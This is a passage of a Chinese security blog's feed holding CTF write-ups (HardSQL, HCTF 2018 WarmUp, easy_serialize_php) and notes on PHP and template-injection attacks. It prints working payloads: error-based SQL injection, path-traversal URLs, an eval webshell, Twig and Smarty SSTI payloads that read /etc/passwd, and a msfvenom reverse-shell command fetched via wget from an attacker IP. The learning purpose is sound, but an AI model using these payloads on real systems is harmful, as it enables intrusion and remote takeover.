class="code"><pre><span class="line">admin&#39;or(updatexml(1,concat(0x7e,(select(right(password,35))from(H4rDsq1)),0x7e),1))#</span><br></pre></td></tr></table></figure><p><img src="/2021/08/30/buu/16/Users/David/AppData/Roaming/Typora/typora-user-images/image-20210830092639064.png" alt="image-20210830092639064"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">补充：</span><br><span class="line"></span><br><span class="line">1：空格被过滤可以使用&#x2F;**&#x2F;或者()绕过</span><br><span class="line">2：&#x3D;号被过滤可以用like来绕过</span><br><span class="line">3：substring与mid被过滤可以用right与left来绕过</span><br></pre></td></tr></table></figure><h4 id="参考博客："><a href="#参考博客：" class="headerlink" title="参考博客："></a>参考博客：</h4><p>[<a href="https://blog.csdn.net/qq_51652864/article/details/115740086">极客大挑战 2019]HardSQL_o3Ev的博客-CSDN博客</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;0x00知识点：&quot;&gt;&lt;a href=&quot;#0x00知识点：&quot; class=&quot;headerlink&quot; title=&quot;0x00知识点：&quot;&gt;&lt;/a&gt;0x00知识点：&lt;/h4&gt;&lt;h5 id=&quot;updatexml&quot;&gt;&lt;a href=&quot;#updatexml&quot; class=&quot;he</summary>
      
    
    
    
    
    <category term="buu" scheme="http://daweitech.github.io/tags/buu/"/>
    
  </entry>
  
  <entry>
    <title>HCTF 2018 WarmUp</title>
    <link href="http://daweitech.github.io/2021/08/29/buu/15/"/>
    <id>http://daweitech.github.io/2021/08/29/buu/15/</id>
    <published>2021-08-29T01:27:04.000Z</published>
    <updated>2021-08-29T02:25:40.066Z</updated>
    
    <content type="html"><![CDATA[<p> 重新回顾了下这题</p><p><img src="/2021/08/29/buu/15/image-20210829094805908.png" alt="image-20210829094805908"></p><p>F12查看到源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params">&amp;$page</span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            $whitelist = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>];</span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>($page) || !is_string($page)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (in_array($page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($page . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = urldecode($page);</span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $_page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($_page . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>($_REQUEST[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; is_string($_REQUEST[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; emmm::checkFile($_REQUEST[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> $_REQUEST[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>代码分析：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p> 高亮显示文件函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params">&amp;$page</span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            $whitelist = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>];</span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>($page) || !is_string($page)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><p>checkfile函数里（），提示我们source.php和hint.php</p><p>访问hint.php得到语句：</p><p><strong>flag not here, and flag in ffffllllaaaagggg</strong></p><p>将传递的参数赋值给page，然后判断若page变量不存在或非字符串</p><p>则echo  “you can’t see it”</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_array($page, $whitelist)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;$_page = mb_substr(</span><br><span class="line">    $page,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    mb_strpos($page . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">);</span><br><span class="line"><span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>若变量page存在于whitelist数组中</p><p>则返回true</p><p>以下看几个php函数：</p><p>php in_array函数</p><p>定义和用法：</p><p>in_array()函数搜索数组中是否存在指定的值</p><p><strong>注释：</strong>如果search参数是字符串并且设置为true，则搜索区分大小写</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">in_array(search,array,type)</span><br></pre></td></tr></table></figure><table><thead><tr><th align="left">参数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><em>search</em></td><td align="left">必需。规定要在数组搜索的值。</td></tr><tr><td align="left"><em>array</em></td><td align="left">必需。规定要搜索的数组。</td></tr><tr><td align="left"><em>type</em></td><td align="left">可选。如果设置该参数为 true，则检查搜索的数据与数组的值的类型是否相同。</td></tr></tbody></table><p>php mb_substr()函数</p><p>mb_substr() 函数返回字符串的一部分，之前我们学过 substr() 函数，它只针对英文字符，如果要分割的中文文字则需要使用 mb_substr()。</p><p><strong>注释：</strong>如果 start 参数是负数且 length 小于或等于 start，则 length 为 0。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mb_substr ( string $str , int $start [, int $length &#x3D; NULL [, string $encoding &#x3D; mb_internal_encoding() ]] ) : string</span><br></pre></td></tr></table></figure><table><thead><tr><th align="left">参数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><em>str</em></td><td align="left">必需。从该 string 中提取子字符串。</td></tr><tr><td align="left"><em>start</em></td><td align="left">必需。规定在字符串的何处开始。正数 - 在字符串的指定位置开始负数 - 在从字符串结尾的指定位置开始0 - 在字符串中的第一个字符处开始</td></tr><tr><td align="left"><em>length</em></td><td align="left">可选。规定要返回的字符串长度。默认是直到字符串的结尾。正数 - 从 start 参数所在的位置返回负数 - 从字符串末端返回</td></tr><tr><td align="left">encoding</td><td align="left">可选。字符编码。如果省略，则使用内部字符编码。</td></tr></tbody></table><p>php mb_strpos函数</p><p>定义和用法：</p><p>查找字符串在另一个字符串首次出现的位置</p><p>基于字符数执行一个多字节安全的strpos()操作，第一个字符的位置是0，第二个字符的位置是1，依次类推</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strpos(*string,find,start*)</span><br></pre></td></tr></table></figure><table><thead><tr><th align="left">参数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><em>string</em></td><td align="left">必需。规定被搜索的字符串。</td></tr><tr><td align="left"><em>find</em></td><td align="left">必需。规定要查找的字符。</td></tr><tr><td align="left"><em>start</em></td><td align="left">可选。规定开始搜索的位置。</td></tr></tbody></table><p>我们大概就可以知道了，这段代码表示截取$page中’?’前部分，若无则截取整个$page</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_page = urldecode($page);</span><br></pre></td></tr></table></figure><p>这里是对page进行url解码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (! <span class="keyword">empty</span>($_REQUEST[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; is_string($_REQUEST[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; emmm::checkFile($_REQUEST[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> $_REQUEST[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;</span><br></pre></td></tr></table></figure><p>这里首先判断$_REQUEST[‘file’]值非空</p><p>第二判断是否为字符串</p><p>再就是能否通过checkfile（）函数校验</p><p>后面是包含$_REQUEST[‘file’]文件</p><p>如果条件不满足就打印滑稽表情</p><p>结论：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.第一个&#96;&#96;if&#96;&#96;语句对变量进行检验，要求&#96;&#96;$page&#96;&#96;为字符串，否则返回false</span><br><span class="line">2.第二个&#96;&#96;if&#96;&#96;语句判断&#96;&#96;$page&#96;&#96;是否存在于&#96;&#96;$whitelist&#96;&#96;数组中，存在则返回true</span><br><span class="line">3.第三个&#96;&#96;if&#96;&#96;语句判断截取后的&#96;&#96;$page&#96;&#96;是否存在于&#96;&#96;$whitelist&#96;&#96;数组中，截取&#96;&#96;$page&#96;&#96;中&#96;&#96;&#39;?&#39;&#96;&#96;前部分，存在则返回true</span><br><span class="line">4.第四个&#96;&#96;if&#96;&#96;语句判断url解码并截取后的&#96;&#96;$page&#96;&#96;是否存在于&#96;&#96;$whitelist&#96;&#96;中，存在则返回true</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">若以上四个&#96;&#96;if&#96;&#96;语句均未返回值，则返回false</span><br><span class="line">有三个&#96;&#96;if&#96;&#96;语句可以返回true，第二个语句直接判断&#96;&#96;$page&#96;&#96;，不可用</span><br><span class="line">第三个语句截取&#96;&#96;&#39;?&#39;&#96;&#96;前部分，由于?被后部分被解析为get方式提交的参数，也不可利用</span><br><span class="line">第四个&#96;&#96;if&#96;&#96;语句中，先进行url解码再截取，因此我们可以将?经过两次url编码，在服务器端提取参数时解码一次，checkFile函数中解码一次，仍会解码为&#96;&#96;&#39;?&#39;&#96;&#96;，仍可通过第四个&#96;&#96;if&#96;&#96;语句校验。（&#96;&#96;&#39;?&#39;&#96;&#96;两次编码值为&#96;&#96;&#39;%253f&#39;&#96;&#96;）,构造url：</span><br></pre></td></tr></table></figure><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">source.php?file&#x3D;hint.php%253F..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ffffllllaaaagggg</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">source.php?file&#x3D;source.php%253F..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ffffllllaaaagggg</span><br></pre></td></tr></table></figure><p>hint.php和source.php都是白名单里文件</p><p>因为我们不知道ffffllllaaaagggg文件存放的具体位置<br>所以可以依次增加   ../</p><p>最后拿到flag</p><p><img src="/2021/08/29/buu/15/image-20210829101454490.png" alt="image-20210829101454490"></p><p>借鉴于：</p><p>[<a href="https://www.cnblogs.com/R-S-PY/p/12095264.html">HCTF 2018]WarmUp - AlexANSO - 博客园 (cnblogs.com)</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt; 重新回顾了下这题&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2021/08/29/buu/15/image-20210829094805908.png&quot; alt=&quot;image-20210829094805908&quot;&gt;&lt;/p&gt;
&lt;p&gt;F12查看到源码&lt;/p&gt;
&lt;figure cla</summary>
      
    
    
    
    
    <category term="buu" scheme="http://daweitech.github.io/tags/buu/"/>
    
  </entry>
  
  <entry>
    <title>渗透测试_基础入门_概念名词</title>
    <link href="http://daweitech.github.io/2021/08/27/src/1/"/>
    <id>http://daweitech.github.io/2021/08/27/src/1/</id>
    <published>2021-08-27T07:44:57.000Z</published>
    <updated>2021-08-27T08:26:25.702Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://blog.csdn.net/weixin_44519789/article/details/114131958">https://blog.csdn.net/weixin_44519789/article/details/114131958</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://blog.csdn.net/weixin_44519789/article/details/114131958&quot;&gt;https://blog.csdn.net/weixin_44519789/article/details/114131958</summary>
      
    
    
    
    
    <category term="web" scheme="http://daweitech.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>leak</title>
    <link href="http://daweitech.github.io/2021/08/25/src/leak/"/>
    <id>http://daweitech.github.io/2021/08/25/src/leak/</id>
    <published>2021-08-25T07:41:00.000Z</published>
    <updated>2021-09-01T02:21:23.823Z</updated>
    
    <content type="html"><![CDATA[<p>PHP漏洞介绍</p><p><a href="https://www.jb51.net/article/31898.htm">https://www.jb51.net/article/31898.htm</a></p><p>针对php网站的主要几种攻击方式</p><h3 id="1-命令注入"><a href="#1-命令注入" class="headerlink" title="1.命令注入"></a>1.命令注入</h3><p><a href="https://blog.csdn.net/qq2539879928/article/details/106635907">https://blog.csdn.net/qq2539879928/article/details/106635907</a></p><h3 id="2-eval注入"><a href="#2-eval注入" class="headerlink" title="2.eval注入"></a>2.eval注入</h3><p>eval函数，常用：@eval($_POST[‘cmd’])</p><h3 id="3-客户端脚本攻击"><a href="#3-客户端脚本攻击" class="headerlink" title="3.客户端脚本攻击"></a>3.客户端脚本攻击</h3><h3 id="4-跨网站脚本攻击"><a href="#4-跨网站脚本攻击" class="headerlink" title="4.跨网站脚本攻击"></a>4.跨网站脚本攻击</h3><h3 id="5-sql注入攻击"><a href="#5-sql注入攻击" class="headerlink" title="5.sql注入攻击"></a>5.sql注入攻击</h3><h3 id="6-跨网站请求伪造攻击"><a href="#6-跨网站请求伪造攻击" class="headerlink" title="6.跨网站请求伪造攻击"></a>6.跨网站请求伪造攻击</h3><p>CSRF</p><h3 id="7-Session会话劫持"><a href="#7-Session会话劫持" class="headerlink" title="7.Session会话劫持"></a>7.Session会话劫持</h3><h3 id="8-Session固定攻击"><a href="#8-Session固定攻击" class="headerlink" title="8.Session固定攻击"></a>8.Session固定攻击</h3><h3 id="9-HTTP响应拆分攻击"><a href="#9-HTTP响应拆分攻击" class="headerlink" title="9.HTTP响应拆分攻击"></a>9.HTTP响应拆分攻击</h3><h3 id="10-文件上传漏洞"><a href="#10-文件上传漏洞" class="headerlink" title="10.文件上传漏洞"></a>10.文件上传漏洞</h3><p><a href="https://blog.csdn.net/weixin_44519789/article/details/116570426">https://blog.csdn.net/weixin_44519789/article/details/116570426</a></p><h3 id="11-目录穿越漏洞"><a href="#11-目录穿越漏洞" class="headerlink" title="11.目录穿越漏洞"></a>11.目录穿越漏洞</h3><p><a href="https://blog.csdn.net/angry_program/article/details/107855078">https://blog.csdn.net/angry_program/article/details/107855078</a></p><h3 id="12-远程文件包含攻击"><a href="#12-远程文件包含攻击" class="headerlink" title="12.远程文件包含攻击"></a>12.远程文件包含攻击</h3><p><a href="https://blog.csdn.net/qq_45300786/article/details/108724251">https://blog.csdn.net/qq_45300786/article/details/108724251</a></p><h3 id="13-动态注入函数攻击"><a href="#13-动态注入函数攻击" class="headerlink" title="13.动态注入函数攻击"></a>13.动态注入函数攻击</h3><h3 id="14-URL攻击"><a href="#14-URL攻击" class="headerlink" title="14.URL攻击"></a>14.URL攻击</h3><h3 id="15-表单提交欺骗攻击"><a href="#15-表单提交欺骗攻击" class="headerlink" title="15.表单提交欺骗攻击"></a>15.表单提交欺骗攻击</h3><h3 id="16-HTTP请求欺骗攻击"><a href="#16-HTTP请求欺骗攻击" class="headerlink" title="16.HTTP请求欺骗攻击"></a>16.HTTP请求欺骗攻击</h3><h3 id="17-模板注入"><a href="#17-模板注入" class="headerlink" title="17.模板注入"></a>17.模板注入</h3><p>(从这里找到了大佬博客：<a href="https://www.cnblogs.com/bmjoker/">https://www.cnblogs.com/bmjoker/</a>)</p><p><a href="https://www.cnblogs.com/bmjoker/p/13508538.html">https://www.cnblogs.com/bmjoker/p/13508538.html</a></p><p>模板引擎：这里特指用于Web开发的模板引擎</p><p>​        它可以生成特定格式的文档，利用模板引擎来生成前端的html代码，模板引擎会提供一套生成html代码的程序，然后只需要获取用户的数据，然后放到渲染函数里，然后生成模板+用户数据的前端html页面，然后反馈给浏览器，呈现在用户面前</p><p>ssti模板注入</p><p>​                            —–也称服务器端模板注入</p><p>当前流行框架，比如python的flask</p><p>php的tp，java的spring</p><h4 id="漏洞成因："><a href="#漏洞成因：" class="headerlink" title="漏洞成因："></a>漏洞成因：</h4><p>​        服务端接收了用户的恶意输入以后，未经任何处理就将其作为 Web 应用模板内容的一部分，模板引擎在进行目标编译渲染的过程中，执行了用户插入的可以破坏模板的语句，因而可能导致了敏感信息泄露、代码执行、GetShell 等问题。其影响范围主要取决于模版引擎的复杂性。</p><p>利用图表</p><p><img src="/2021/08/25/src/leak/1344396-20200911174631687-758048107.png" alt="img"></p><h4 id="Twig模板"><a href="#Twig模板" class="headerlink" title="Twig模板"></a>Twig模板</h4><p>由图可以看出，在经过模板解析后的内容</p><p><img src="/2021/08/25/src/leak/1344396-20200818195801226-981945295.png" alt="img"></p><p>payload（2.0）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;id&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/08/25/src/leak/1344396-20200818231853350-914354726.png" alt="img"></p><p>文章还详细介绍了使用msf通过Twig模板注入获取shell</p><p>使用msf生成了一个php meterpreter有效载荷</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter/reverse_tcp -f raw LHOST=<span class="number">192.168</span><span class="number">.127</span><span class="number">.131</span> LPORT=<span class="number">4321</span> &gt; /<span class="keyword">var</span>/www/html/shell.txt</span><br></pre></td></tr></table></figure><p> <img src="/2021/08/25/src/leak/1344396-20200818232520602-1757346385.png" alt="img"></p><p> 模板注入远程下载shell，并重命名运行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(<span class="string">&quot;exec&quot;</span>)&#125;&#125;&#123;&#123;_self.env.getFilter(<span class="string">&quot;wget http://192.168.127.131/shell.txt </span></span><br></pre></td></tr></table></figure><p><img src="/2021/08/25/src/leak/1344396-20200818232914668-1182705687.png" alt="img"></p><h4 id="Smarty模板"><a href="#Smarty模板" class="headerlink" title="Smarty模板"></a>Smarty模板</h4><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;self::getStreamVariable(&quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;)&#125;</span><br></pre></td></tr></table></figure><p>CTF地址：<a href="https://buuoj.cn/challenges%EF%BC%88CISCN2019%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BAWeb11%EF%BC%89">https://buuoj.cn/challenges（CISCN2019华东南赛区Web11）</a></p><p>xff头做文章，进行注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For：&#123;sysytem(&#39;cat &#x2F;flag&#39;)&#125;</span><br></pre></td></tr></table></figure><p>这题我没有单独写文章，因为解题过程很快，知识点对应上了。</p><p>smarty-ssti常规利用方式</p><p><strong>1. {$smarty.version}</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;$smarty.version&#125;  #获取smarty的版本号</span><br></pre></td></tr></table></figure><p><img src="/2021/08/25/src/leak/1344396-20200820233050238-1942906786.png" alt="img"></p><p><strong>2. {php}{/php}</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;php&#125;phpinfo();&#123;&#x2F;php&#125;  #执行相应的php代码</span><br></pre></td></tr></table></figure><p><img src="/2021/08/25/src/leak/1344396-20200820233259128-196602210.png" alt="img"></p><p><strong>3. {literal}</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language&#x3D;&quot;php&quot;&gt;phpinfo();&lt;&#x2F;script&gt;   </span><br></pre></td></tr></table></figure><p><img src="/2021/08/25/src/leak/1344396-20200820233719367-1535357026.png" alt="img"></p><p><strong>4.</strong> <strong>getstreamvariable</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;self::getStreamVariable(&quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;)&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/08/25/src/leak/1344396-20200820234305773-495371489.png" alt="img"></p><p><strong>5. {if}{/if}</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;if phpinfo()&#125;&#123;&#x2F;if&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/08/25/src/leak/1344396-20200820234610811-341143885.png" alt="img"></p><p>python中的ssti</p><p>常见模板有：jinja2， tornado</p><h4 id="Jinjia2"><a href="#Jinjia2" class="headerlink" title="Jinjia2"></a>Jinjia2</h4><p>以Django的模板为模型的</p><p>它是flask框架的一部分，Jinja2会把模板参数提供的相应的值替换了  块。</p><p>Jinja2使用 结构表示一个变量，它是一种特殊的占位符，告诉模版引擎这个位置的值从渲染模版时使用的数据中获取。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;PHP漏洞介绍&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.jb51.net/article/31898.htm&quot;&gt;https://www.jb51.net/article/31898.htm&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;针对php网站的主要几种攻击方式&lt;/p&gt;
&lt;h</summary>
      
    
    
    
    
    <category term="src" scheme="http://daweitech.github.io/tags/src/"/>
    
  </entry>
  
  <entry>
    <title>安洵杯 2019 easy_serialize_php</title>
    <link href="http://daweitech.github.io/2021/08/19/buu/14/"/>
    <id>http://daweitech.github.io/2021/08/19/buu/14/</id>
    <published>2021-08-19T01:39:03.000Z</published>
    <updated>2021-08-24T12:21:58.416Z</updated>
    
    <content type="html"><![CDATA[<h4 id="0x00知识点"><a href="#0x00知识点" class="headerlink" title="0x00知识点"></a>0x00知识点</h4><p>[<a href="https://www.cnblogs.com/wangtanzhi/p/12261610.html">安洵杯 2019]easy_serialize_php - 王叹之 - 博客园 (cnblogs.com)</a></p><p>[<a href="https://www.cnblogs.com/h3zh1/p/12732336.html">安洵杯 2019]easy_serialize_php - h3zh1 - 博客园 (cnblogs.com)</a></p><p><a href="https://www.runoob.com/php/php-var_dump-function.html">https://www.runoob.com/php/php-var_dump-function.html</a></p><p><a href="https://www.w3school.com.cn/php/func_filesystem_file_get_contents.asp">https://www.w3school.com.cn/php/func_filesystem_file_get_contents.asp</a></p><h4 id="0x01解题"><a href="#0x01解题" class="headerlink" title="0x01解题"></a>0x01解题</h4><p><img src="/2021/08/19/buu/14/image-20210819094121329.png"></p><p>发现了参数f</p><p>代码如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$function &#x3D; @$_GET[&#39;f&#39;];</span><br><span class="line"></span><br><span class="line">function filter($img)&#123;</span><br><span class="line">  $filter_arr &#x3D; array(&#39;php&#39;,&#39;flag&#39;,&#39;php5&#39;,&#39;php4&#39;,&#39;fl1g&#39;);</span><br><span class="line">  $filter &#x3D; &#39;&#x2F;&#39;.implode(&#39;|&#39;,$filter_arr).&#39;&#x2F;i&#39;;</span><br><span class="line">  return 